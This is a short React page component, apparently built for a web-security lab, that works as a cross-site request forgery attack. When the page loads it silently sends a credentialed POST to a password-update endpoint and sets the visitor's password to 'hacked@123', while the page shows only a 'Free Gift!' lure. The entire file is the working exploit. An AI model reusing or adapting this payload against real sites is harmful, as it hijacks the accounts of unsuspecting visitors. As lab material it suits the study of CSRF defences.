"use client"
import { useEffect } from "react";

// Evil page that changes the password of the victim who visits this page

export default function Evilpage() {
    useEffect(() => {
      hackeuser()
    }, []);

    const hackeuser = async () => {
        let res = await fetch("/api/lab-user/updatepassword",{
        method : "POST",
        headers : {
            "Content-Type" : "application/json"
        },
        body : JSON.stringify({currentpassword : "whatever",newpassword : "hacked@123"}),
        credentials : "include"
      })
      let data = await res.json()
      console.log(data)
    }

    return <h1>Free Gift! 🎁</h1>;
}